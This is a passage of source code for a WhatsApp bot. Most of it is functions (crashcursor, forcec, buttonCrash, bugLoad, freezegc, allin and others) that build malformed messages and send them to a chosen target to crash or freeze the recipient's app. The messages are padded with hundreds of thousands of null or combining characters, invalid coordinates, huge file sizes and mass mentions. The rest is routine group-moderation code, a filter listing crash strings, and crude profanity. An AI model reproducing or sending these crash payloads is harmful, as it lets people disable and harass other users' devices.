                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath: "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption: "sebuah kata maaf takkan membunuhmu, rasa takut bisa kau hadapi"
                    },
                    contentText: "༑ Fail Beta - ꧁𝕿𝖍𝖚𝖌𝖓𝖎𝖋𝖎𝖈𝖊𝖓𝖙꧂X⌣X 🐥 \"👋\"",
                    footerText: "© die?",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(850000),
                            buttonText: {
                                displayText: "girlfie"
                            },
                            type: 1
                        }
                    ],
                    headerType: 3
                }
},
conversionSource: "porn",
conversionData: crypto.randomBytes(16),
conversionDelaySeconds: 9999,
forwardingScore: 999999,
isForwarded: true,
quotedAd: {
advertiserName: " x ",
mediaType: "IMAGE",
jpegThumbnail: pici,
caption: " x "
},
placeholderKey: {
remoteJid: "0@s.whatsapp.net",
fromMe: false,
id: "ABCDEF1234567890"
},
expiration: -99999,
ephemeralSettingTimestamp: Date.now(),
ephemeralSharedSecret: crypto.randomBytes(16),
entryPointConversionSource: "kontols",
entryPointConversionApp: "kontols",
actionLink: {
url: "t.me/devor6core",
buttonTitle: "konstol"
},
disappearingMode:{
initiator:1,
trigger:2,
initiatorDeviceJid: target,
initiatedByMe:true
},
groupSubject: "kontol",
parentGroupJid: "kontolll",
trustBannerType: "kontol",
trustBannerAction: 99999,
isSampled: true,
externalAdReply: {
title: "! sam? - \"𝗋34\" 🩸",
mediaType: 2,
renderLargerThumbnail: false,
showAdAttribution: false,
containsAutoReply: false,
body: "© 2025",
thumbnail: pici,
sourceUrl: "go fuck yourself",
sourceId: "dvx - problem",
ctwaClid: "cta",
ref: "ref",
clickToWhatsappCall: true,
automatedGreetingMessageShown: false,
greetingMessageBody: "kontol",
ctaPayload: "cta",
disableNudge: true,
originalImageUrl: "konstol"
},
featureEligibilities: {
cannotBeReactedTo: true,
cannotBeRanked: true,
canRequestFeedback: true
},
forwardedNewsletterMessageInfo: {
newsletterJid: "120363274419384848@newsletter",
serverMessageId: 1,
newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
contentType: 3,
accessibilityText: "kontol"
},
statusAttributionType: 2,
utm: {
utmSource: "utm",
utmCampaign: "utm2"
}
},
description: "by : ꧁𝕿𝖍𝖚𝖌𝖓𝖎𝖋𝖎𝖈𝖊𝖓𝖙꧂X⌣X 🐥"
},
messageContextInfo: {
messageSecret: crypto.randomBytes(32),
supportPayload: JSON.stringify({
version: 2,
is_ai_message: true,
should_show_system_message: true,
ticket_id: crypto.randomBytes(16),
}),
},
}
}
}

await ThugBotInc.relayMessage(target, messagePayload, {
additionalNodes: stanza,
participant: { jid : target }
});
}
//


async function Fuckui(target) {
  try {
    let message = {
      viewOnceMessage: {
        message: {
          messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
          },
          interactiveMessage: {
            contextInfo: {
              mentionedJid: [target],
              isForwarded: true,
              forwardingScore: 999,
              businessMessageForwardInfo: {
                businessOwnerJid: target,
              },
            },
            body: {
              text: "FUCK UI",
            },
            nativeFlowMessage: {
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
                {
                  name: "mpm",
                  buttonParamsJson: "",
                },
              ],
            },
          },
        },
      },
    };

    await ThugBotInc.relayMessage(target, message, {
      participant: { jid: target },
    });
  } catch (err) {
    console.log(err);
  }
}
async function InvisibleLoadFast(target) {
      try {
        let message = {
          viewOnceMessage: {
            message: {
              messageContextInfo: {
                deviceListMetadata: {},
                deviceListMetadataVersion: 2,
              },
              interactiveMessage: {
                contextInfo: {
                  mentionedJid: [target],
                  isForwarded: true,
                  forwardingScore: 999,
                  businessMessageForwardInfo: {
                    businessOwnerJid: target,
                  },
                },
                body: {
                  text: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃",
                },
                nativeFlowMessage: {
                  buttons: [
                    {
                      name: "single_select",
                      buttonParamsJson: "",
                    },
                    {
                      name: "call_permission_request",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                    {
                      name: "mpm",
                      buttonParamsJson: "",
                    },
                  ],
                },
              },
            },
          },
        };

        await ThugBotInc.relayMessage(target, message, {
          participant: { jid: target },
        });
      } catch (err) {
        console.log(err);
      }
    }
  //
  async function forcec(nomor) {
     let target = nomor
     let msg = await generateWAMessageFromContent(target, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "single_select",
                                        buttonParamsJson: "z"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "{}"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});

            await ThugBotInc.relayMessage(target, msg.message, {
                messageId: msg.key.id,
                participant: { jid: target }
            });
        }
        async function test(nomor) {
    let target = nomor;
    let msg = await generateWAMessageFromContent(target, {
        viewOnceMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        title: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃",
                        hasMediaAttachment: false
                    },
                    body: {
                        text: "𝓭ץⓝ𝐀ᵏᎥ𝕃𝕃"
                    },
                    nativeFlowMessage: {
                        messageParamsJson: "",
                        buttons: [
                            {
                                name: "single_select",
                                buttonParamsJson: "z"
                            },
                            {
                                name: "call_permission_request",
                                buttonParamsJson: "{}"
                            }
                        ]
                    }
                }
            }
        }
    }, {});

    
    await ThugBotInc.relayMessage(target, msg.message, {
        messageId: msg.key.id
        
    });
}
async function allin(target) {
      for (let i = 0; i < 1; i++) {
        await crashcursor(target, ptcp = true)   
        await InvisibleLoadFast(target);  
        await forcec(target)
        await crashcursor(target, ptcp = true)
        await InvisibleLoadFast(target);  
        await forcec(target)     
        await crashcursor(target, ptcp = true) 
        await crashcursor(target, ptcp = true) 
        
        await InvisibleLoadFast(target)  ;                    await forcec(target)
        
        await crashcursor(target, ptcp = true)
        await crashcursor(target, ptcp = true)
      }
      console.log(chalk.red.bold(`SEND BUGS FORCE TO ${target}`))
      }
      
//
const ctt = {
			key: {
				remoteJid: '0@s.whatsapp.net', // 'status@broadcast', menggunakan remote jid bernilai 'statusbroadcast' akan menyebabkan pesan crash pada wa desktop. sebagai alternatif, saya menggunakan nilai '0@s.whatsapp.net'
				participant: '0@s.whatsapp.net',
				fromMe: false,
			},
			message: {
				contactMessage: {
					displayName: (pushname),
					vcard: `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname}\nitem1.TEL;waid=${m.sender.split('@')[0]}:${m.sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
				}
			}
		};

async function buttonCrash(target) {
    ThugBotInc.sendMessage(m.chat, {
        image: pici,
        caption: "forcec" + "ꦾ".repeat(50000),
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: `𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️`,
                body: `𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️`,
                previewType: "VIDEO",
                thumbnailUrl: pici,
                sourceUrl: "t.me/Hughie_H",
                mediaUrl: global.url2,
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
                advertiserName: " x ",
                mediaType: "IMAGE",
                jpegThumbnail: null,
                caption: " x ",
            },
            placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
                url: "t.me/Hughie_H",
                buttonTitle: "konstol",
            },
            disappearingMode: {
                initiator: 1,
                trigger: 2,
                initiatorDeviceJid: target,
                initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
                title: "! 𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️- \"𝗋34\" 🩸",
                mediaType: 2,
                renderLargerThumbnail: false,
                showAdAttribution: false,
                containsAutoReply: false,
                body: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝",
                thumbnail: null,
                sourceUrl: "go fuck yourself",
                sourceId: "dvx - problem",
                ctwaClid: "cta",
                ref: "ref",
                clickToWhatsappCall: true,
                automatedGreetingMessageShown: false,
                greetingMessageBody: "kontol",
                ctaPayload: "cta",
                disableNudge: true,
                originalImageUrl: "konstol",
            },
            featureEligibilities: {
                cannotBeReactedTo: true,
                cannotBeRanked: true,
                canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363222395675670@newsletter",
                serverMessageId: 1,
                newsletterName: `ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                contentType: 3,
                accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
                utmSource: "utm",
                utmCampaign: "utm2",
            },
            quotedMessage: {
                buttonsMessage: {
                    documentMessage: {
                        url: "https://mmg.whatsapp.net/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0&mms3=true",
                        mimetype:
                            "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                        fileSha256: "+6gWqakZbhxVx8ywuiDE3llrQgempkAB2TK15gg0xb8=",
                        fileLength: "9999999999999",
                        pageCount: 3567587327,
                        mediaKey: "n1MkANELriovX7Vo7CNStihH5LITQQfilHt6ZdEf+NQ=",
                        fileName: "PL",
                        fileEncSha256: "K5F6dITjKwq187Dl+uZf1yB6/hXPEBfg2AJtkN/h0Sc=",
                        directPath:
                            "/v/t62.7119-24/26617531_1734206994026166_128072883521888662_n.enc?ccb=11-4&oh=01_Q5AaIC01MBm1IzpHOR6EuWyfRam3EbZGERvYM34McLuhSWHv&oe=679872D7&_nc_sid=5e03e0",
                        mediaKeyTimestamp: "1735456100",
                        contactVcard: true,
                        caption:
                            "a sorry word won't kill you, you can face fear",
                    },
                    contentText: '༑ Fail Beta - ( devorsixcore ) "👋"',
                    footerText: "© running since 2020 to 20##?",
                    buttons: [
                        {
                            buttonId: "\u0000".repeat(900000),
                            buttonText: {
                                displayText: "𐎟 𝐓𝐝͢𝐗 ⿻ 𝐂͢𝐋𝐢𝚵͢ 𝐍𝐓͢ 𐎟",
                            },
                            type: 1,
                        },
                    ],
                    headerType: 3,
                },
            },
        },
    }, { quoted: ctt });
}
			async function chanelEnd(target) {
ThugBotInc.sendMessage(m?.chat, {
    document: fs.readFileSync("./package.json"),
    jpegThumbnail: { url: pici },
    fileName: "𝐊𝐢𝐧𝐠 𝐆𝐚𝐛𝐢𝐦𝐚𝐫𝐮 𝐂𝐫𝐚𝐬𝐡",
    fileLength: 99999999999999,
    pageCount: 100,
    mimetype: 'application/vnd.openxmlformats-officedocument.wordprocessingml.document',
    caption: "𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️" + "ꦾ".repeat(50000),
    contextInfo: {
        externalAdReply: {
            containsAutoReply: true,
            mediaType: 1,
            mediaUrl: '',
            renderLargerThumbnail: true,
            showAdAttribution: true,
            sourceUrl: "t.me/Hughie_H",
            thumbnailUrl: pici,
            title: `${pushname}`,
            body: "𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️" + "ꦾ".repeat(50000),
        },
        forwardingScore: 10,
        isForwarded: false,
        mentionedJid: [m?.sender],
        businessMessageForwardInfo: {
            businessOwnerJid: "2349116057855@s.whatsapp.net"
        },
        forwardedNewsletterMessageInfo: {
            newsletterJid: '120363297314470847@newsletter',
            serverMessageId: null,
            newsletterName: "Wʜᴀᴛsᴀᴘᴘ Bᴀɪʟᴇʏs Sᴇʀᴠɪᴄᴇ"
        }
    }
}, { quoted: { key: { participant: '0@s.whatsapp.net', remoteJid: "0@s.whatsapp.net" }, message: { conversation: `𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️`}}})
  }
  async function buttonCrash2(target) {
    ThugBotInc.sendMessage(m.chat, {
        image: pici,
        caption: "𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️" + "ꦾ".repeat(50000),
        contextInfo: {
            mentionedJid: [m.sender],
            externalAdReply: {
                showAdAttribution: false,
                renderLargerThumbnail: false,
                title: `𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️`,
                body: `꧁𝕿𝖍𝖚𝖌𝖓𝖎𝖋𝖎𝖈𝖊𝖓𝖙꧂X⌣X 🐥`,
                previewType: "VIDEO",
                thumbnailUrl: pici,
                sourceUrl: "t.me/Hughie_H",
                mediaUrl: global.url2,
            },
            conversionSource: "porn",
            conversionData: crypto.randomBytes(16),
            conversionDelaySeconds: 9999,
            forwardingScore: 999999,
            isForwarded: true,
            quotedAd: {
                advertiserName: " x ",
                mediaType: "IMAGE",
                jpegThumbnail: null,
                caption: " x ",
            },
            placeholderKey: {
                remoteJid: "0@s.whatsapp.net",
                fromMe: false,
                id: "ABCDEF1234567890",
            },
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
            entryPointConversionSource: "kontols",
            entryPointConversionApp: "kontols",
            actionLink: {
                url: "t.me/Hughie_H",
                buttonTitle: "konstol",
            },
            disappearingMode: {
                initiator: 1,
                trigger: 2,
                initiatorDeviceJid: target,
                initiatedByMe: true,
            },
            groupSubject: "kontol",
            parentGroupJid: "kontolll",
            trustBannerType: "kontol",
            trustBannerAction: 99999,
            isSampled: true,
            externalAdReply: {
                title: "! 𝙾𝚁𝙴𝙺𝙸 𝚅2 🕊️🕊️🕊️ \"𝗋34\" 🩸",
                mediaType: 2,
                renderLargerThumbnail: false,
                showAdAttribution: false,
                containsAutoReply: false,
                body: "ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝",
                thumbnail: null,
                sourceUrl: "go fuck yourself",
                sourceId: "dvx - problem",
                ctwaClid: "cta",
                ref: "ref",
                clickToWhatsappCall: true,
                automatedGreetingMessageShown: false,
                greetingMessageBody: "kontol",
                ctaPayload: "cta",
                disableNudge: true,
                originalImageUrl: "konstol",
            },
            featureEligibilities: {
                cannotBeReactedTo: true,
                cannotBeRanked: true,
                canRequestFeedback: true,
            },
            forwardedNewsletterMessageInfo: {
                newsletterJid: "120363222395675670@newsletter",
                serverMessageId: 1,
                newsletterName: `ᑢꋪǟՏHꍟᖇ 𝘸ʜᥲｔₛმ𝗽𝑝${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                contentType: 3,
                accessibilityText: "kontol",
            },
            statusAttributionType: 2,
            utm: {
                utmSource: "utm",
                utmCampaign: "utm2",
            },
        },
    }, { quoted: ctt });
}


			async function bugLoad(target) {
for (let i = 0; i < 5; i++) {
await chanelEnd(target)
await buttonCrash(target)
await buttonCrash2(target)
}
}

//

//
  async function freezegc(target) {	
          const jids = `_*~@254104301695~*_\n`.repeat(10200);
	      const ui = 'ꦽ'.repeat(1500);	
		    let etc = generateWAMessageFromContent(
				target,
				proto.Message.fromObject({
		           groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        locationMessage: {
                            degreesLatitude: 922.999999999999,
                            degreesLongitude: -9229999999999.999 
                        },
                        hasMediaAttachment: true
                    },
                    body: {
                        text: ui + jid,
           "contextInfo": { mentionedJid: [ "0@s.whatsapp.net" ] }
                    },
                    nativeFlowMessage: {},
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "0@s.whatsapp.net"),
                        groupMentions: [{ groupJid: "120363301095727346@newsletter", groupSubject: " 𝙎𝙋𝙄𝘿𝙀𝙍-𝙓 " }]
                               }
                            }
						}
					},
				}), {
					userJid: target
				}
			);
			await ThugBotInc.relayMessage(target, etc.message, {});
		}

//===================°°
const qkontak = {
key: {
participant: `0@s.whatsapp.net`,
...(botNumber ? {
remoteJid: `status@broadcast`
} : {})
},
message: {
'contactMessage': {
'displayName': `꧁𝕿𝖍𝖚𝖌𝖓𝖎𝖋𝖎𝖈𝖊𝖓𝖙꧂X⌣X 🐥`,
'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;ttname,;;;\nFN:ttname\nitem1.TEL;waid=6285624297893:+62 856-2429-7893\nitem1.X-ABLabel:Ponsel\nEND:VCARD`,
sendEphemeral: true
}}
}		  




        // Determine current time and greeting
        const xtime = moment.tz('Africa/Lagos').format('HH:mm:ss')
const xdate = moment.tz('Africa/Lagos').format('DD/MM/YYYY')
        const time2 = moment().tz('Africa/Lagos').format('HH:mm:ss');
        let ThuggyTime =
            time2 < "05:00:00" ? "𝘎𝘖𝘖𝘋 𝘔𝘖𝘙𝘕𝘐𝘕𝘎 ☀️" :
            time2 < "11:00:00" ? "𝘎𝘖𝘖𝘋 𝘔𝘖𝘙𝘕𝘐𝘕𝘎 🌤️" :
            time2 < "15:00:00" ? "𝘎𝘖𝘖𝘋 𝘈𝘍𝘛𝘌𝘙𝘕𝘖𝘖𝘕 🌤️" :
            time2 < "18:00:00" ? "𝘎𝘖𝘖𝘋 𝘌𝘝𝘌𝘕𝘐𝘕𝘎 🌃" :
            "𝘎𝘖𝘖𝘋 𝘕𝘐𝘎𝘏𝘛 🌒";

        // Auto-react function
        const Thugreact = async (m) => {
            const emojis = ["😭", "🧡", "😂", "🤣", "😏", "🙂", "🥲", "🙃", "🌝"];
            for (const emoji of emojis) {
                await sleep(80);
                await ThugBotInc.sendMessage(m.chat, { react: { text: emoji, key: m.key } });
            }
            const randomemoji = emojis[Math.floor(Math.random() * emojis.length)];
            await ThugBotInc.sendMessage(m.chat, { react: { text: randomemoji, key: m.key } });
        };

        // Function to count total features
        const thugfeature = () => {
            const mytext = fs.readFileSync("./Case.js").toString();
            return (mytext.match(/case '/g) || []).length;
        };
        
        
        
        

             let chats = global.db.data.chats[frommeky]
               if (typeof chats !== 'object') global.db.data.chats[frommeky] = {}
               if (chats) {
                  if (!('badword' in chats)) chats.badword = false
                  if (!('antiforeignnum' in chats)) chats.antiforeignnum = false
                  if (!('antibot' in chats)) chats.antibot = false
                  if (!('antiviewonce' in chats)) chats.antiviewonce = false
                  if (!('' in chats)) chats.antispam = false
                  if (!('antimedia' in chats)) chats.media = false
                  if (!('antivirtex' in chats)) chats.antivirtex = false
                  if (!('antiimage' in chats)) chats.antiimage = false
                  if (!('antivideo' in chats)) chats.video = false
                  if (!('antiaudio' in chats)) chats.antiaudio = false
                  if (!('antipoll' in chats)) chats.antipoll = false
                  if (!('antisticker' in chats)) chats.antisticker = false
                  if (!('anticontact' in chats)) chats.anticontact = false
                  if (!('antilocation' in chats)) chats.antilocation = false
                  if (!('antidocument' in chats)) chats.antidocument = false
                  if (!('antilink' in chats)) chats.antilink = false
                  if (!('antilinkgc' in chats)) chats.antilinkgc = false
                  if (!('antipromotion' in chats)) chats.antipromotion = false
               } else global.db.data.chats[frommeky] = {
                  badword: false,
                  antiforeignnum: false,
                  antibot: false,
                  antiviewonce: false,
                  antispam: false,
                  antivirtex: false,
                  antimedia: false,
                  antiimage: false,
                  antivideo: false,
                  antiaudio: false,
                  antipoll: false,
                  antisticker: false,
                  antilocation: false,
                  antidocument: false,
                  anticontact: false,
                  antilink: false,
                  antipromotion: false,
                  antilinkgc: false
               }
            
            let setting = global.db.data.settings[botNumber];

// Ensure setting is an object
if (typeof setting !== 'object' || setting === null) {
    global.db.data.settings[botNumber] = {};
    setting = global.db.data.settings[botNumber];
}

// Set default values if they don't exist
setting.totalhit = setting.totalhit || 0;
setting.totalError = setting.totalError || 0;
setting.online = setting.online || false;
setting.autosticker = setting.autosticker || false;
setting.autodownload = setting.autodownload || false;
setting.autobio = setting.autobio || false;
setting.autoread = setting.autoread || false;
setting.autorecordtype = setting.autorecordtype || false;
setting.autorecord = setting.autorecord || false;
setting.autotype = setting.autotype || false;
setting.autoblocknum = setting.autoblocknum || false;
setting.onlyindia = setting.onlyindia || false;
setting.onlyindo = setting.onlyindo || false;
setting.onlygrub = setting.onlygrub || false;
setting.onlypc = setting.onlypc || false;

setting.watermark = setting.watermark || { 
    packname: global.packname, 
    author: global.author 
};

setting.about = setting.about || { 
    bot: { 
        nick: ThugBotInc.getName(botNumber), 
        alias: botname 
    }, 
    owner: { 
        nick: ThugBotInc.getName(global.ownernumber + '@s.whatsapp.net'), 
        alias: global.ownernumber 
    }
};

            
        if (db.data.chats[m.chat].antispam) {
if (m.isGroup && m.message && Thug_antispam.isFiltered(from)) {
console.log(`[SPAM]`, color(moment(m.messageTimestamp * 100).format('DD/MM/YYYY HH:mm:ss'), 'yellow'), color(`${command} [${args.length}]`), 'from', color(m.pushName))
return await ThugBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}
}
//auto bio            
if (db.data.settings[botNumber].autobio) {
            ThugBotInc.updateProfileStatus(`*🚀 ${botname} is Live! 🎉\n🕒 𝙐𝙥𝙩𝙞𝙢𝙚: 𝘙𝘶𝘯𝘯𝘪𝘯𝘨 𝘍𝘰𝘳 ${runtime(process.uptime())} ⏳\n\n© 𝐓𝐡𝐮𝐠𝐧𝐢𝐟𝐢𝐜𝐞𝐧𝐭 𝐓𝐞𝐜𝐡™*`).catch(_ => _)
        }
        if (!ThugBotInc.public) {
            if (ThugTheCreator && !m.key.fromMe) return
        }   
            
        if (!ThugBotInc.public) {
            if (ThugTheCreator && !m.key.fromMe) return
        }
        if (!ThugBotInc.level) {
            if (ThugTheCreator && !m.key.fromMe) return
        }
        if ( db.data.chats[m.chat].antiviewonce && m.isGroup && m.mtype == 'viewOnceMessageV2') {
        
        delete msg[Object.keys(msg)[0]].viewOnce
        val.message = msg
        await ThugBotInc.sendMessage(m.chat, { forward: val }, { quoted: m })
    }
        //antidelete 
        if (m.type == 'protocolMessage' && global.db.data.chats[frommeky].antidelete) {
				const mess = chatUpdate.messages[0].message.protocolMessage
				if (store.messages && store.messages[m.chat] && store.messages[m.chat].array) {
					const chats = store.messages[m.chat].array.find(a => a.id === mess.key.id);
					chats.msg.contextInfo = { mentionedJid: [chats.key.participant], isForwarded: true, forwardingScore: 1, quotedMessage: { conversation: '*[ DELETED MESSAGE DETECTED❗]*'}, ...chats.key }
					await ThugBotInc.relayMessage(m.chat, { [chats.type]: chats.msg }, {})
				}
			}
     //auto type record
        if (db.data.settings[botNumber].autorecordtype){
        if (isCommand) {
            let xeonmix = ['composing', 'recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            ThugBotInc.sendPresenceUpdate(xeonmix2, frommeky)
        }
        }
        if (db.data.settings[botNumber].autorecord){
        if (isCommand) {
        	let xeonmix = ['recording']
            xeonmix2 = xeonmix[Math.floor(xeonmix.length * Math.random())]
            ThugBotInc.sendPresenceUpdate(xeonmix2, frommeky)
        }
        }
        if (db.data.settings[botNumber].autotype){
        if (isCommand) {
        	let xeonpos = ['composing']
            ThugBotInc.sendPresenceUpdate(xeonpos, frommeky)
        }
        }
        
        //auto block number
        if (m.sender.startsWith(`${autoblocknumber}`) && db.data.settings[botNumber].autoblocknum === true) {
            return ThugBotInc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('91') && db.data.settings[botNumber].onlyindia === true) {
            return ThugBotInc.updateBlockStatus(m.sender, 'block')
        }
        if (!m.sender.startsWith('62') && db.data.settings[botNumber].onlyindo === true) {
            return ThugBotInc.updateBlockStatus(m.sender, 'block')
        } 
        if (!m.sender.startsWith(`${antiforeignnumber}`) && db.data.chats[m.chat].antiforeignnum === true){ 
        	if (ThugTheCreator || isAdmins || !isBotAdmins) return
            ThugBotInc.sendMessage(m.chat, { text: `*[ FOREIGN NUMBER DETECTED ]*\n*${pushname}, +${antiforeignnumber} isn't allowed in current group*\n*Sorry 👀*` }, {quoted: m})
            await sleep(2000)
            await ThugBotInc.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
        }
        let list = []
for (let i of ownernumber) {
list.push({
	    	displayName: await ThugBotInc.getName(i),
	    	vcard: `BEGIN:VCARD\nVERSION:3.0\nN:${await ThugBotInc.getName(i)}\nFN:${await ThugBotInc.getName(i)}\nitem1.TEL;waid=${i}:${i}\nitem1.X-ABLabel:Click here to chat\nitem2.EMAIL;type=INTERNET:${ytname}\nitem2.X-ABLabel:YouTube\nitem3.URL:${socialm}\nitem3.X-ABLabel:GitHub\nitem4.ADR:;;${location};;;;\nitem4.X-ABLabel:Region\nEND:VCARD`
	    })
	}
	        //ANTI VIRUS
if (db.data.chats[m.chat].antivirtex) {
if (budy.includes('𝐂𝐑𝐀𝐒𝐇') || budy.includes('𝑿𝑬𝑶𝑵') || budy.includes('@') || budy.includes('๑๑๑๑๑๑๑๑') || budy.includes('😈') || budy.includes('   ⃢   ⃢   ⃢  ') || budy.includes('*⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃢ᡃ⃟⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢ᡃ⃢⃟⃟ᡃ⃟ᡃ⃟ᡃ⃢ᡃ⃢ᡃ⃢⃟⃢⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟ᡃ⃟') || budy.includes('ꦾꦾꦾꦾꦾꦾꦾทุเ้') || budy.includes('𝐂𝐑𝐀𝐒𝐇') || budy.includes('👹') || budy.includes('👿') || budy.includes('ٯٯٯٯٯ') ) {
if (isGroupAdmins) return reply('*VIRTEX DETECTED*')
console.log(color('[KICK]', 'red'), color('Received a virus text!', 'yellow'))
